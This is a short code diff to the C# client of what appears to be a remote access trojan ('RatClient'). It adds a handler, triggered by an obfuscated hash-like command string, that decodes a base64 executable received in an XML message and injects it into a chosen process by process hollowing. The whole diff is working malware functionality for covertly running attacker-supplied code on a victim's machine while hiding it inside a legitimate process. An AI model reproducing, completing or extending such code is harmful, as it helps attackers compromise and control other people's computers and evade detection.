@@ -3,6 +3,7 @@ using RatClient.ProcManage;
 using System;
 using System.Xml;
 using System.Text;
+using System.IO;
 
 namespace RatClient
 {
@@ -74,6 +75,17 @@ namespace RatClient
 				byte[] result = Encoding.UTF8.GetBytes(Mtool.FileExp.EXP.GetValidExeAndDir(path));
                 Console.WriteLine("End Processig Files");
                 return result;
+			}
+            else if (command == "b11c081208b1d6466c83e37098510d73")
+            {
+                string exePath = Path.Combine(
+					xmlDoc.SelectSingleNode("/root/path").InnerText,
+					xmlDoc.SelectSingleNode("/root/file").InnerText
+		        );
+                Console.WriteLine($"Processing path {exePath}");
+                byte[] exePayload = Convert.FromBase64String(
+                    xmlDoc.SelectSingleNode("/root/exeonbase").InnerText);
+                return Tools.ProcessHollowing(exePath, exePayload) ? new byte[1] { 48 } : new byte[1] { 49 };
 			}
             else
             {
